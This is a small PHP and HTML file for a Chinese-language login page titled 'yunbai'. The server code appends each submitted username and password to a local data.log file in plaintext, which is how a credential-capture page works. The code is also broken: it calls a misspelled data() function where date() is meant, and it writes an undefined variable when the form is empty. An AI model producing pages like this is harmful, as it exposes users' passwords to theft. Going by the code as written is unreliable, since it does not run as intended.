<?php
$name=$_POST['name']??"";
$pass=$_POST['pwd']??"";
if(!empty($name)&&!empty($pass)){
    $data=data('Y-m-d H:i:s')."用户名：{$name}|密码：{$pass}\n";
}
file_put_contents('data.log',$data,FILE_APPEND | LOCK_EX);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>欢迎来到yunbai</title>
</head>
<body>
    <form method="post" onsubmit="return test()">
        用户名: <input type="text" name="name" id="name" placeholder="请输入你的用户名">
        <br>
        账号密码: <input type="password" name="pwd" id="pwd" placeholder="请输入密码">
        <br>
        <button type="submit">点击登录</button>
        <br>
        <button type="reset">清空重置</button>
        <br>
    </form>
    <script>
        function test(){
           let n=document.getElementById('name').value;
           let p=document.getElementById('pwd').value;
           if(n!==""&&p!==""){
            alert("欢迎进入yunbai，希望好运！");
            return true;
           }else{
            alert("请完善信息！");
            return false;
           } 
        }
    </script>
</body>
</html>